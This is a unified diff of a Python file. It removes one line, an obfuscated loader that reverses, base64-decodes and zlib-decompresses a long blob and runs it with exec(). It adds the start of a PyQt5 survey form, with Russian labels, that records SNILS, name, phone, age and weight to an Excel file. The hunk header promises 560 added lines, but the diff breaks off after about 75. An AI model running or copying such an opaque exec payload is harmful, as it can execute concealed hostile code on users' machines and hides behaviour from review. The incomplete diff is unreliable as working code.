@@ -1,1 +1,560 @@
-_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'ZUeSU+/997/fKLF4Hz8of/3NnzjAsduGHNdEeLC1RL/wY/pamVSHah94R7ROx+6nnux3jPUssBBLaCLQBoeyDrdQnzEkNxuClNshHCSWxAGu7RsuV1yEWggXykJyY8o7uvnVl8bRbmb1BsY5k4muftaqRg0mtzUC0Z/b4JIYfal2jHQpeFwIkEU17LYPYGePiWvqqAd7i1oUCd00tGmwrFCUmMK0bHRQK5Jk9HFmC6bFmW+enJ7jhJn5/S7xTJPkD2PiR/8OiyHxodm5HWeD1GigawJR/QwSiwmnCiiYlKo+E+tM9+cp3DnsyTObciUxr3Pf/k58P3zpgno1zlDZP5e0AQ6yRdF5jTRZ9vNQ6P0e69sPoFEHLrK0Zv8rVm7XNia6Qs0+vtgWoh/9cwQoS1JSdRrBP16undrBAZr7CdCwRuHXGbYgVpDmdXDyzeGTxx5hE6p5q8wIWJNOvKdd7M3rUFXcN72P+qm0MfrIDTuIbADkaAiKAqbhrMzTQ0vEuCWpA+GdULWdWLqm3QddZge+zUIQZXNhHi8eB96JqqEutjap/U5gvKvx+Gn5YXoH90H64WMiiLfrAyREKSQVCDjds6EU3ptS5H0L6OHwl9D7T+w1gVuHGKHnP70XZRGRLq833kovEBXZ/WmilcqA1EUJc8S9OcN7lj7fU2f3wWRfEBNG6uTJFZqyatnxE7NjKOtJz6YZaTegyYYfS9ToBY+Z68KzT/6qqowQV9k5GRMx9UntLD3xeNose9YRmmBd86N+m8Fy5z1E9C+X2Zrb1GXAMhTMZ0uDgtSVbRycinfhLXap887PD2xGRMjDTkqzP1OesFa4k0f+4iWOpyajwAt3NAViRzyeIDAmKF1zxn4MxFy+rURj03z/0k0WAq0kdIzGI+R+Vjb854irOdR/8I10iJFteuNxIbBNa3vNl0WoaMkCjm6lm4PASsUX9dcZQlgEhy7IhmN3drO5QDsrG63v54kEP3bKr//3+nIk9nhwPVJz3H9wy74yd1oXwSPbD8gv0euVDfe6jZPsklkZT+bKKJKgMUE0HV6bV2rangYEYPt9Tl25DVRgq5n83CRcYTITWXNEZqIu8ZWtxu954JzngkD3dl1nXGdr0dGbjxGwYsyfVXzR4UibbXrTnT2n3+atFObgbPYRZKCw/+keN9AqrYP/sbQfGKSPf7ttnXkOHStZaS7+fUakHWKlCvV0lj1oD7UTTZaIoFPIbNCXaoHDPT8ndlJFAU/vjeuo8JqZ1+1PuSTCXNe5DZyXcjXnTf+BSE7C1W7RhxEEX3zgEHGlBawNkDa2p0gnDXNSNjG6JkRYfl+qyISkY+X2eKiaIkGFe9hAuW9KI6kEQPAtg75J2+uF9E8foKuD2XKz/v8vsDBRpRQkJCHEMlCwOw7XrXG+B67KNX6VNVutW5zQys2zhkNDVH2Rt/3CAErQx/lqmgBtYWxwcsuQXcKQGoMtcnEDAR9JJQculCNA80TinkVH9ereLZr09PfZFbZt+MPyfCtrxwXWUtoORTPpalLykpSR6++s+NNFWmnmont/U2tNMk8Syf8k5ypQsFl1dq+U87bvS9ouARPCszbq1GfEbePj1fD4ZdGmkoywpnx+3dnvAzSXJ0I5G7Q+GUMZfPhIuLeCkhlZXRC9c0ULxLdx0V1xkunHIrdtqGBqZ/9oubFI066ElSStIfAsIyDiUV1VAvq2CxgVeKvlDBFtAep5gqccNgFjhxdhiRn2Wn87bTVtBqZ8gnVefJ7lzys0NvkufsnwuE355/kGyPBaejVFmhaRUkQUymQKKWkT5mq5LvFMxCBxIRR8u7rsGousDsRSrhAOveaj1PhKbEGSaWJS+GBxEet4QFtEWNJ85/i2EeaT7I2dhoAGleq8WVwVRwmy5qmJ/Pn41YnFabOu77kif09kTmUysekupvx0xDRlReUt7lybgSeDxIGN0GdBRHKg3iOhjnqbcasCDXiD2BNwdhGLHa9t0Ryau63PpHvAEzenmA+QF68WXvSI+tX8zofN+d2tALoH7lzxszgR0A87lwsEHsdsksd27/x1OW/n/AlJfDG+2qxfRIHdtPvTEps0tL3PEUK5axRMPrTkCLMfae2bMDnuiows+rcNDz4I6rmSs8S3iw05xrB0KzBZuMWTdQAEllnaz4GxfZVZkPxmeKSGwyhcPzVVqwBKp3ch//6ukumPpsEhqt2m0DSBZO/Dl65rNbTjtsn0neHY2X+akh3u0+FudR5vrywChCCKrNaC88A3T6GjjzLcS8DGPdIOrN1RlQsi9EidA8g67wmZRwO52ld0TlPb83HsgOiOm6C7SBMeO+FTuIhqeF691gDRH08oNvLvcaP6KP6f2a1eyGTKwpx2jrAy96vrPUcVOXt/+Y9JoLP0CbHWx81wO2ozueIwfFbuss6SgoHRyJdSQuBm4Fuf+r7n/QIAQAGPVi2rrHEFJQRIPcV+ozKeLvFbKGlpRxNiyEdSgnLFKQWpqiygCzf6PYLaBLOJB2llA0MXIsHdQYzXHZGL/OugVLi8JxNRv+zeTcm3cwG+AIaGANzHfpiunIv5VTE+EvAWqD8eoRqUPWwSjThni+HYiPliNLrXNabMm42wWe910sFHaJC3QyK9ERyOwqo7ha8LmAz6ijyM9PitASpGev40xYFqE3VslLke1+uRa+dU22kfxa/mzHlpAtCUe83HfG3Yx+ZQMuB3GsCipvAVACnoB/utbpYA2M3DvRWCxS789rxmKXl1c4OrkKuNM6UGVPdCsXG5CwRKu1J/+iC6wpPWlIqvPyteb3keJKWzqg7v81O2Bi32K8ZdPoWfTJr6imAq/d2S/mBAshY/ezrbXFrkwOqvAqYixhG/dfPEUWcuc4mrnaAwHnBu7rYDpeL/ZJ/R7N45uCcgLdE1dtvQHMjGKa1jgHvkiJ04e1/AOhy9LgnljAu1SdolSTXiGlssU4puywqQu5g6poMNO7U6hmL62Jzf3+rdF/5M/8bkSfE/M1KV6Qxz26j6G8znvVg3qvzM7D85eLV3B6t9I693O6WOayT2Vrr2PcHrn+8G0mNR2QO+Jra/UHUmRWWiPqdxb5xPYk/Tvv2v0vL8Y4Mbrkz+BW1qLzSxPIeWU+rPDQPJlJitiHfnUXAZhqKD0gQuNntqvAFgMPZSv6yaU1iyw2YKeIM3aGGrIrCYFCG3ttTA9O/KfZOHcyJivPdSP16WncXXSyVBjXsPk79gWvGJx0RjO1DoWJSVomlcTRXGKOp3/U1KIrBkRP7XllPlY7x7NKCsSye91M4t+1E0VQYvFC5Cy4+/qAYdTEl3J6InnAGhK9J1cxFTZgOfemBffK5Nq/rhZVBxIO/eKd1U5bDms0+cPDT8pPpdtehkGsx2s5iE9TPbE04p2bDyJxPaiFw8cCFAurX+72K580TbKJ0peZ93zhEwU2a4StkqPsqLHNdOhwE0uAfq4JT+QyzFbTVArA82hzDUtBICYwXhyRG6+DrskootmNu+yS8+tF9SPXwoG06GTcnzAeNTtwvR2f1axVKMcHw+RIYbCh/1ZfOZ12xApVWNHKb3TGE4IOZzfY87BydFWxOuzcVV2cKtVWTe57hHPYj9dlMV4ym7uCM0Z97YNLMQbLrG7/+rQukuT1ZQIrUqjNUTSMJvcClVd9aVRJ9x7sB965UCrIdtFiekvgnH4ZKntetiL8O2x7Gq6OizpNj5HDXkDrGM5o3L5d4Rp1XAAn1YEfYJe0ZKW3/5xORGxHrSaucMyoD7E3Eu9Ybu+Uc4iTdeO703D55Ju0DZKxuo1dYsS7iZywjLez3WlF5+d5pJbwUP92sU09tGVZOf1gfQ927KfPOgS8bNLEjDblNDF+t1ovRp4wvjX2D9yi1Nw2RFkrnebZq3Li04hkRjAQK2rZrkwRLdptdCpdR+aGRP/0rpzTZYYNOlyWvhkH3Lc/I2MvrvM/DlU5wiZR6ujQ/mzbgTvp1v30twkf5PonKcEr0Zpv6zAQSB6w9zjJtu8BtcRmXJf8Md8rFYMwq8C59bJ3u13sdNoSjarLbq6GOXoXdcfi0z4m6EnOFqej9InAI31s06Tf0EzAmqK2tH5+hfK0UYqIzko7S7yDlbT6x2mutf2HzUBh61gCR0uYYrqHhkHaCHgZEQk3w65q4OpS6vavX9rRvkHi5iRrih2+U6GLgW5P07vKhf2mLTASDNzIIbFWgsdqwJONy+yQg+0zqR+83fwq+b+ku1/Mb75IWcAd1egCN1TN9sFMe4SApOW9knFyaxsABwWrXgnj6Qiw9qH7XukY92/IiQ9KQAugzdUDw6+yYBPBunvTjfk8gz9+PJU1ALDt2DtPnk7I4yVdkG6dLclt95Q4O3smKIUWBxg99uWmGqKLDicPGXjQLv0W0upm1CrNplJkKDuaqlVMFw808vPJJ1mKs/AHESgwjg2JMlhVLCMfDGtq9Ibwvf+6P9R1k/o+0Qf8Bf3bASeooyIBxygC//giihPApuvTAZcbKpyuGSCY5uE4A3h8w6pd+z7neQNKIczZO0AQfH1IMJzrnzU3Ckyh4k69mftelH9zia3FtDNd4mTaFvbb0TRv6uq1lCsuU9vuIW2esZvLNEaTJ0fmOBgFLHmSXb36ogODHQdQ5llrVreh/gBbaNwZ+PLkT6ZhDJ4GNHZj95aKbuW63axYYnqKDcy+FHc4nAEFtKLA+KAiQDUZBDMnDteFUf5fNFdy9r2NZIrGVU2pvRaF+639wg8052xXmIhJYBXW4+uBrXgTUMF3ZUXrjeBj8H0B+hnWaLfoEXmI0osz0z0KgHjzD+BJnO8NUK5NmYjWmvts/ZqDC6kNyZ8vmQaUa4EiQrh6stMYuZ4elUetdzDpLr07hHAceLarvW3cElO0QRKraZgef4NMUy97P4EZoIM7XFOwrtSI2h2jaPnaCZIr6Gblu6x9HWLfzyCiGXzSlPkoqvmfHvdN+I0SmpDi5buEUxCfgm9AmGQF5OhyG2SHeSdP9mhkDejtxEPbxs1bu4a94yZdDk9ztCDvsPXGUI6ZcyE/VaydxJkEaAoVQumPTMaBpr8+i3OEI5inw7vHetQiCfjtF9MsrmH1BAe4XC2EDKcB5TOxKtDcMnYvAz+1U35H8xIteuLCp0P1Z7nhHZjZYicx8OZ1ndY/GkR2YnbU9eov2fBxqbtvNby/4+xmFr6Oo8kxvYXK4WsaKOGIql5Sc+lNIJMiY5uC6HpwM5+764v5GCHvg6vXelrugN6qhtygQUYPd2877975DZhFSXAfPkv9EVd4SQuE0DY4fiGtyDBLO8FFHQ3arNzK8zaWseWhLpteZfBhczdt7qZkvMvbTRjOiAtaFeIP+iYif+916ME01NX7zosprThK2fLMXdL9VhQteM2tO7eG/3h+9PIGEe1+ulDEgkU4YXD25LqwzcglFv9hpcSOW5JE/j1zVtdEdvPMkDIREjlBpQFKR7r3KUV4A5uPARJwkDu/UJP5Oatc9kwrqCIFDMrzKfHtfdHnRcDKVStk/wSx1UNnyvLQt0za7tmVMbxOwn1KdioHhJgqoT2Soz++BgUEYD9RSCCqk4irNWhf71rR5CFYmWU242HMst30BfpFbwSW+BCPR/rdzU4sDFd9nBovrbNP/9Px55h3VCDjawvPnF0j1b2MNGsRunx9FWwaXcrTZy7H1xGiaxheQwRCZj7EKk9Etp+ye2IrsEV2jJ/dfzGO3yUDXL6+1aZtVMttocCn8rjhU9jy5SShAoThj2sM/cATUVtHY9jiHySWj/qrhfK987RsPwOF7+qR5kRypKCW5ozPjiZaFKGYCzrUTsER/+ZGoScbtd++EW3XNaVG69Z4X3RziIhfJIy95IDZOQzTjvXKiVE3OZR0CmGJllMtpBLeFD/azjdk9BvNVHrPJd9QBczdEmR4sApg8jyQZsjNE8Ce7H3+LYffbcY29GTv4djb3l+1Mh+ATp5okctNfhVsPAysyTQ9Rers2wXT1xs3oqXahTIy4jE/miFdNFChh8AOfNbPoPbiKfAdLjjsol9GSDCF6Qcsqg2nb1lWjftemZMSt1MeQTCOYYmUP5PJBE5OFVEIGT88XLDGH2E+rymWdKA/ySiYRpsmnsfCsjzglsbcRep0UGdFm0wRBCtkT/64JV3PWWyH7TBO6++ogGjavRYpSQqVcyPjrJV+IJ7VcP5KNfSNcMAaUakWwFjZM8feCxVK5dpPiw2DUigLKBB0PDqm5E90HIvLNqiaHYTxiPJApFqDBiRSDMQIsLhgIPUnfc0njdEporOx1I/tSyB0RD4XcofmYlRXqLqb3YPDFR78+fTYKDcJG7zOgGX1R/KlUeyb3LmHwJyF1nfcu/pRyGibwi9Bo1l5JJwA6c9YJGmp8u6/cp63LLYIKqvjWqOsuxX/nEnmB/X1qaDThV3ArJyvEgX/afs8a9+XttJhqfVSmG6b2hTXr1mPAanW8I7pzhxl1Yv0wNHhxnU014vTOwhwjl+PIBa3h6xkPT2owA9kLqGj/qWIJ3qPUtiKgsVIpe6s9Sjm1nBhMsZtcZDL3l4vkx4imeVSUU3UJ+3mWwuYKGYMBI/XDZcrcoZoTQo/a1MYy7bqL8REb9nKH7drqt7vEcTdD2TW2Lfp55xEK43iv8o5/AL4LmFjvn+/5ENI+t6mWTYqAmRR46tFKQiqfU+AHkyR7P6ayR51Mm+I8HX+7b+H//khHS2InaFgBXAuKEmiL1wizmUuzD/1leUO0fFc9pj1N7DZ+O3+CPaOpHK9tthaCe6f9A9IIIbt/p0SWLdJb6PEYOdSetxJZE/Y3S2QL0k7Cp37D2oE+GoqFnfZCNDRaVcvYTdNlo6lVqVai+wsyfXQ6xfVqU1nXgykV0i9ALdGFBct/+quwdbKDGsE29F/OX9PrDYS94ymojsjf3yVT9XDejf+rJLex9ibQhRuku0NUNM3V+caQ89IbfMcC+z0xaWrvmuXY1fTnebmoBHAkKn7UeEALbDEl/40ObLpfYQ0eUPxpNVAnqMI1gwOuYnE3KdNkZXl/RdN/nJkORg8Zpb52UCfcwNfPLLxRfAtPHRsc9lyEisiSDBLc1gPHz54jA+F/9YaznkbCL/YIVspaSkdDT8M6DyoPScqh+9PToEY0Q91nz59AM9CRgX9qn3equ2Zw3GULG4Ai/Rcz7LmOLEaTxVvElXBCpWzVxH1smcfD3PSUZzJCi/13aXWL+0vPkK2eZ4DR5ARax67iPfjuNkGOZwPTF3FMgSUDtulW6cqzLI/TT9sMFfYvIQa6+ulit/YmCVDPGNLY7pBd/sqKsNJCcQfsVrru76upyBY5PMgChXzTt7WwEb7z4MrWuB8vLv+Qhj37Py9v0QhOTjCMWZ3JAZx6aA+FeRxKSl4FQT6eic9JeTLw4UYvFuxaYP/EAFI+1F+acIym3PidmHgwb1EDMP9TD8r3NMmw/NSNFKm9I+rX849yzE5WDXK/n+VhBtv34J3T6PeVsfdSBlpr2a3BhrU1CH6Elcprp+WFQ651gF7ugUu+zTsze7t8i5pyq1DAvMh2zbZ+EE/huwmn4gH+TI518jUAFeQfOnQvDSwclomvi+3ShBYax9ygBMW2yJCUzMu2k/WG/53UA9LMq8e7lBjaBIVPurv0RRObjSkATbv/uW4IdDk7Hrf603/VrRSC9nu2XzsVd2qK0n8jCrVCl4boXnEHNGFGYIAB7TxG4LZD6S5AxulInmjAz4R6RlCCxI5slHXtmPQBplJE+j4QZ/Eewz9Tgl2wr1ze1gqXneEyppPOJtfq1RvSsI7cK5Dq9W//58+baFhOfLyTJKOkdJeP7ji6l613n7ScF4Uitpwg5M4fgsCF9jbvIaD6sRY0BSWVnQXLHZjZWsBoW3hG4IfXoAjUP1FyM8B+LXrYThKEooiQ9SKNavz+D3dKuyrzjySNJCKPjK4Ue5luXe9utf0YatYFGIi8Rxr0IzX8BVk1YTNsf4t/rs9OnZsDR3eU9JabcMjUXslwOhplJDHyDd+JzsRoYroLH80owL0F8/qrkPaEvbKtuuxQVjmJ5PKKZnkSLimESAiAv9V+Mz2WxiWVIXDiAd81gfRy9RsRP+CSGVbWEBdIl68gCZpRU9enwKPPCAnXxSUTrw1jefnl+HFvfgoblP5QD75WzP3YyxLb0dOU1PDnZCjqqhpPZ5FTVSSFA2Z3sZ69BWnPBpBwlQZ1dcHTCb4+vwECKNs/Rnn1ftOAgDbqYEr4kEohdDaOZXbRx5ciYctrbaKwR++vB/raTXv6MxN35gL5yFx2B1cOHuz4XrlKQ5JsqIR4H24wrrb5KAnit9bq80zT3mfrengTafWf0BvMEANSbL996SpQrdIEpsCWN5A55A0nK8HKT0vec25SR38uIwbKyY9hdUYiLu4rqGm6oxf8L1y/wFOgOUDD8TZ5KczheTiVZLvfr1sC92VD6fWxVs3liqk0x2JJOcnWpznajJzfA28vX7CjPWCgfPtPRvWc0gUDS3ef5itP6WCE3BGgfVrte/sH9rT1DEkmbR2Eby/OhIIZp2LfozRXUemg0hx/61OUyYLXLSXEOR48Ef6yXmp2SgyD9F80FVL97UpJ5W+jmoCVdnsUNGI++ijvf7K6UgK37uRuIRi/htbz1Q4osglBGLNgRZrP8xfekIy4mUAJ7kjlk6z1r/KX+U2Z3qMIlnHu1l3k4EhL1825btfR2OOUF/xJj/s2ZtwLRsOoo84rJwIr+gF7oTCprcVGfRURbGA+pzNrfBTJUPPvV4biyZRm8qQphkM5wNGTi8xIweT9ZbkauJDRJIvMh7JrKBLFsHblItaUCsF+YnONlYLzy/tJrt8auxw02GLqSmT7zFnoVs0o7eM5g9vkuAh9awgjXBD4eGnpZgMNBwtvaPBa/i6rDdbWww1WMURDPf8ymmKLCRw9OLzjlDo/EchorA9LhEhP05MhoeD5wqWGXNVR7Lwq12EwMUzPE0hGDPMP3659MYWDR/ylM3eBt7DJ9PcNVvryj8lEaI/tprBZnZ1DF7O4ZGLWVCkJTHsX9hZQ+8PKoLRQaYJzTajotCF0vwJpHavIh2nTXVl6zRBzHni2uZ5dfDsSh2InT3Z/zgA3REjU3skYHvKVAQuhm6QUiUxB2zpLSlRcLJdfNrIqIYzU9k8jLviJOU+uqqmyCwCD0lwvwWaKRMB4lnytU3DnvTFTD0rRFN1Ms8vWSa8vMmillqUw+Q21g3bdl7Ob9iCGrsEYvj4xpOP7dhffRFyUjQ4d4IDMX2yp26x/mm/km4XUJj4eIsW/LDmXtd21imVYt3c8sni+ViRqy2+3VWEFdjQErmuOJJ06dy0qW8Q2K8MzXHm/gqxvTQy6iATa3VGQan+GVbA2R7aCI1L7WqFNj4NpRJYI9zrbXC3t7gP5ICCGON587I0eseV2fYP6wpA8wI4bP+CeVPiIQztFDzJ8olWYmbftBVsGUJoogDjxAlwYHf+IQ9lReWS7BnLa2mDyVRucwziHYvQRmcggfBXvDdiqxD1VX8Ela8EWI6oiGw6ysvASVac9HtDmS6VxEtt3nsjVrecruCgSewOEwuCOeMJkcfILsE7g1YXvyhn177fmXnRn5MM6dQE/G772o3zJbfdRJa/snZgCzh8CvfoG0bN8cDszGzT1YmFQZvuQo/QyauvTYFCXx7wXWOhldrdWAYsIWjD0h7B1icXsDqbP+g4BtvzhS8xl7qra0K4FN8py6cnOwJeoFHZq0K1xun2ALtg+r9apXWK19RPrDdphEJLwa2q+eymelvfv7+p8mnWlNP3kzY7h13hP9sg00NuuQ4Xfm7KDNoiE37O2PWIJJrCupnN4w/8mF6Vo6mrkiFVI90r1BXB/4l1Xvm3vY+ANaGqsWvN9DhMXJ3BII6AheVQ+Nf0j/N/xUjs98GyA/6HtX2lWLgifiYM32twU8zdy5evE5SCC91CiLaS73s/rP7u21KDkpEnrqdcps6Wy1rRabNOiLxj5BtOvo7Tg4v8mvVNwFGHbFyA9uxNxEEXt8vuHNtSNzU19ce4XGrYHnbbeZr8BmVZVvwf36XbDZSRWBr8ayevp3+mh3uLVTZhpeP/BdRf6jEZSlPx2XxX8ms4bOX2ZVeEaVzGMXBFYlhJ1aasFEJE8qAUc7YFfPGRU4q40JIBDXsOh5B6nsNkhH8LMlf1MZrYETnfUejjwrhV/0DS2WMXgc0tdLv+uoIMs9KHFK/Dqsb5aihFM88jFWV1a1sh0o7d2AXKTi6IJtYWP0fb+ihbDlGoWo6Z38cOiAcLpbTD7DJNlxWe4NKLF5cp/biLTw/A0EADV2X30tmfYPgYyqkuDrAvgRJvfysNg/7waVvVHjJx62Rrt3MTC3mINpZ2FOERIqYnHVP39SlPrBH5946CBBTWGeKgf5lKerD7v5yspMHmD7b5lOw8gKN1AXM7CEORql5/I3ya+jTtAIHDpZsNx7Tefe31c4yvTvmZwKEUL4ExLknz4jKsQMgzvSegfmAletzr66oEjaPPcNkTT2zf/KQ6IXSsaWuBVjPNUkXKxI5RwCcjFB8adpT4AgrOaDgrbh2qkYjKhw3HV4kaVTqKM5V5bY8xJYSA9UQJBmk3XnhQ/ctPq5pZ2xtvzNF0pE9yx8lrK5sFUWiTWcZc6EmytlzX1Z+mK3KTTxTV66hkEpLNmORe7tHCIfNsvJ72g76f4NHzf9Kk9cwdvz4ouXNIBHoPZULra9SAUu1HytF553A2FRylr8ZAmQNDeJOg2i0sTVImczSMPMymwrcyZN5Zu+5+Bse9AB5LUzFehjtIAk9LNjJnm8AGZh3DlYWHOASOXXDVKimvF5zFgHWBhIgfbjHGK9PNHcQ3Kn6XYFw/Ld39RSn5js+wJAzY47+0uo9UPsiLNp2U7kYqFEHgO8nHcR0vSWK1sXkGI36LFEkJ4zfwJxN60i5EIMi4koCMbHtueSmTP+7Qhb1wh4TJEKL4tNwFe+3kxTLmDFw/xjsZRr6IZjQbFpYbzizI0AnV6w8e/Uqv7CwRLdXqn+okmMguoWkgsS9vuUtLEY7KlYdwuEXHBOY6MfZB1ZGAFZv+y5ixPQLH/45GekXM++6uFGsOJvzD0ItlncanqE1wEthZWy2IOI6u5C3kizg8nGHQWeLD6U4S6hlpOZCYMIJpxG5h5G3jCLATEcl1pFd3PMEWSGKSuHx+RckiBloK8EczSjQUNf+nfo1NL2hkvZtleppydNSjvf0RMoFvRtuTZ10eB2kXZ7gIpVhZxS6E2pfclrkjcD3JmR7XJAVHlmBKKYzKH+0BPIqpxm599GuGAJErQravuGbjdnPGtNIkFXBs5OvPareySvEs9IfPiqLmD3hlsQFQ/jsg9Bx8HAgmKaQ1xAVO68mpwDI5UdCUOFUNE6LBsti2jlSJjmPIub8bLiYaPqXQPIeUzkfLanbZr85qwoHAKCftKqEjM5a1f8fNovvumdU3PgXcMbo5Yy1OAuXWSlLiPQff+cE2kS7IKaiZmoIiKApuEzUuiJcAjQ4WteXM0bbGxsysrpBvbTzFvdpsshk0+Ke3xitiHSy/ochAr5lIQ2/i2U6A8h5eHX9NfJVHusvGJdcsspXOuH9PbJlGiDhMNtE/Zh+yzxSIs8l5tEIX0lQHGO5ZAnPBBRgmmqNTKaNt5+NzFQ2kM0hpMD9GAdmgRri4lH1WN7ejpQlnzo1mdHqYdNLJ+a2gNtBFreDgfsq19JhN6XQEg2ZR0PDfTO9ykThmAlrvi8aEHrcjfPYvdxOZ7cbJFeUxMFT3rYw6UGvbCT5XsvLpvO7cxc2iHjUtvUlqoAhzuFbPDzvN5kd8cTTtQJ7ZPfh6dMRKBkTLjYcLnPl2siKZM/qtuvmrhymNpWg66AqTujNakxj2qPzPozDRAguwJeZPVxksYA9wVi2n1KQQbYhDdOfGMwb8DCJqVkRlc/6cEMkuDGdyTLJ2J0qIjSyeoWzr3w2OWNjjIrQ8Dhi34flUmFs5rJmKHa84Zds2xtBlgMfel4rECuvMtjXFuZPhkHCPSuC0M1vToG/FtDTtM5we9yqXomUd8JVQ+qn45tm7SslUU6EWE3Z4uJUhzSJpQb+SImNbzBMBCF2trWjIf6JqU+3RpSN+ZmTV0Gs1WeFBFpaqesX9Fuli67MySe3wprmaDKysJNjYAl3GIRAdGp3rG1cZwvUA3i0RO0O3C5+U6SoJ6cltwayiy3NJwVd2CC30tfTsFE0ktAK9UmGaId/4TYaPTpKaA1jJPeTLaYk0g93kiuoxhsxY44bU3GT1KkKzazTg5JdiuYHGbjkWeGzYqLWzodl9+Q8sx9pZgU0CPFigfH89jbICfRsVIN/DW0ShR3VvhrqdDhH3KaUKwfnyyh5Mcm3tBpD9YbpW9PP5IIHTW+kVgvY9outjt9C4pgKIGvvXCbt0CWQ75p3so9f1qrV2pmddW/gnB6me9yeQApO7BRZmjvBz9jOqMtv0MdWhjSR0SzUHsJfAyYQqJWLf+Pl0WHD8aLoc/NjfrL1dp69eDiOPnRTx4wQdH6rv8Xq1tf7DIeJo1RE379cYfiTdZ8eFasKwez5Xty6q8SeIlVa7g6HEkQ+APuhUEQGkwGyE7qZUQifncoTgtnQWWyrnq39ABaVjZBLvsiYxoAxhVXaCqCu3cEz2culZfpnZ9tXAOxSuXc9BeeYqgQmkMdSO3aPxoaVBoAwWinhh9U8yhAmqHZFjD3ze31hXWWwp/HJhW8HHp6KnlEl93pN28f8JgoJDQ1BEvUt9KuDzrEDnVXNrDJJC1sDkWtvkhk/bTN8ueJ+zsxKp9ovlmkjLBsEvkRdDgzJHtNDFQickquDiSjY0F5qnxcbYeSUgUK8Mdr+le0KDGIBcvV0/av+Ynva6qmidZSE0jbtz9TSRLE1W84oNR6rnMYaxo1bM+cKYXoN0YuKcFjfwSsMYh+YiveNeR5ZjLcQCBJzEOOORDJCDgwoUS3Y6OEltSRm8/1vpHUbLAanNO7T6i2uucYCy3txzzv+K4N59hyqreo98MmyuiSUewze4ca+V04pF2ASx18h7YA+U1+tsTc0ThTaMUSm9iyx+hlQMTwDO2hO2r7XsYMQlozEzPiXgIGop4YCjoUkKaIN6uW9w7NLyeXPkb+dUdexnNNgKAAfPshYII0QmrfAMw1b1ri7zN+uRGkyM6qqQOzuS/nKRHg8YaH6z4mgm/VyNz5D4LJKEho1vamVnimGqM3t6XjqoCFyIiQkBvNFE7CDqJ+p5El9to+giO9nUAmldxmj1u/oxtDLnajHU+ll9RfHQIdMPzKLCWVTZFBZ4cLavDwL/rQuw89J07g6U5azWoWHraapC+mKOx4F5NcCom3CWPp8G1o3Zf0Ffo1Bc3GwNbIMZxGyW2NGbvP4si1EvXGNkfLN7c3eszV9m3dYCInxbAvYgs9Lnr0aCG7DQiUENFo+C1vml7xn2Wrl64RPDW4Pt9Lcbjzaoy7almrnhk9h8ibewsfRCNk2Aa9YCcSnFxKvkpwu8Kq0RxWbCsdEfr1tSnI2/bD3aTHeUBu+K6Vz4HHHZ8XXBWisoez58L7zxTGTywYdIAAi2bEkdkjkNPmWY4VMV00NAXM5p1NBI0oXgDNuRg15KLZ6LSQy78oOiloRhMKRxKmQwVem+JUg4Qjm2UwsWo2wje8lVbwK+g4K+qK0JO5Vkq1PEBwQmN2Hdn6162qX9r9bZ9lKxxbDoPMhT8vOOYP0s30mJ5NOgI4CItHGqCXpqfW2ebodSNyw4ar5iyyD28gj9yOLtPUBOpW6jvve7B8GktvXCiiCulV2EME/JJgcnWk3yTRqkqPdsHZhOS4WEdPsYXp/4X9m4mxPzxswsAGQ4lHp+oKDdjIjyq8muKW1AZmJd6z98Id5afHvvCCRPQoP/N0HT4N4qmwpmGsMUn+qrg9P6DMLyeRx1/IvOuwswfaKFYhAlG6Kr3J9hekDAo4W1LLnG1aHMnwp/DrwUVFVI1GHv3Jd6B/B3nONMvjbrCmHFDmJlxEshBVPi5panTRjyeWXO5mLY20uLwDEwcLvrREy2eCtIuemPEWMCJQREI90osCHzPIoSEEAShiT+J6fB35dJu0lFcUCo19DRL7xJP19zP9/pw7VnFCuTdYPKF2e88yDtMeOaM+VnGqmmsIT4sL11kYfB7hVQRRXKYKYtofqEPR3pyaimHSq0d3w0Mjg+If86AsJGs1NiA7bCdcKNwhGFVhANLbQCHYZIeRJWKRTGd0UIThB5zfsCCIOjMKEcVcUzKP8f/4HBhwN48F2u94TIWUW8XIOubP1inHi1685w+gEHg2QnWlSN0Yj33Sq+TcVYGt9A/jsfqMBOtiC5d/gPdP9Cu3i87tDIYTxi2AV6DLPrh+YT0shS54UCBKUi2TWphu7xL9XlF3j426zSpsNzg1icJgo77i2t48WD+yfsmEb4NQdCPvYQ0gHoUvAIfPBS+yjxLCrJMn2eW1526+PQgBluTAOyC+MfiLY1LjHGCj2nVYZGsum4ULlfVmWJeTelBlivxWRq/evLJSgE7c6fpRPlv/J7///d+8/Lz7pcNKHnTr7pdVxeiZ57vvWySGJ6FTm1CidUQMCc5bn+TRWg96yW7mVwJe'))
+import sys
+from PyQt5.QtWidgets import (
+    QApplication, QMainWindow, QPushButton, QVBoxLayout, QWidget, QLineEdit, QLabel,
+    QComboBox, QMessageBox, QCheckBox, QFormLayout, QHBoxLayout, QStackedWidget
+)
+from PyQt5.QtGui import QIntValidator
+from PyQt5.QtGui import QRegularExpressionValidator
+from PyQt5.QtCore import QRegularExpression
+from openpyxl import Workbook, load_workbook
+import os
+
+# Path to Excel file
+EXCEL_FILE = "survey_data.xlsx"
+
+class MainWindow(QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("Главное окно")
+        self.setGeometry(100, 100, 300, 200)
+
+        self.button = QPushButton("Создать запись")
+        self.button.clicked.connect(self.open_survey_form)
+
+        layout = QVBoxLayout()
+        layout.addWidget(self.button)
+
+        container = QWidget()
+        container.setLayout(layout)
+        self.setCentralWidget(container)
+
+    def open_survey_form(self):
+        self.survey_form = SurveyForm()
+        self.survey_form.show()
+        self.close()
+
+class SurveyForm(QWidget):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("Опросник")
+        self.setGeometry(100, 100, 400, 600)
+
+        self.is_empty = False
+        self.gender_m = True
+        self.gender_f = False
+
+        self.layout = QVBoxLayout()
+        self.form_layout = QFormLayout()
+
+        # User info fields
+        self.snils_input = QLineEdit()
+        self.snils_input.setPlaceholderText("XXX-XXX-XXX YY")
+        self.snils_input.setInputMask("000-000-000 00")
+
+        self.fio_input = QLineEdit()
+        regex = QRegularExpression("[А-Яа-яЁё\s-]*") 
+        validator = QRegularExpressionValidator(regex, self.fio_input)
+        self.fio_input.setValidator(validator)
+
+        self.phone_input = QLineEdit()
+        self.phone_input.setPlaceholderText("X (XXX) XXX-XX-XX")
+        self.phone_input.setInputMask("0 (000) 000-00-00")
+
+        self.age_input = QLineEdit()
+        self.age_input.setValidator(QIntValidator(50, 99, self))
+        self.age_input.editingFinished.connect(self.check_value)
+        self.age_input.setFocus()
+
+        self.weight_input = QLineEdit()
+        self.weight_input.setValidator(QIntValidator(38, 200, self))
+
+        self.gender_input = QComboBox()
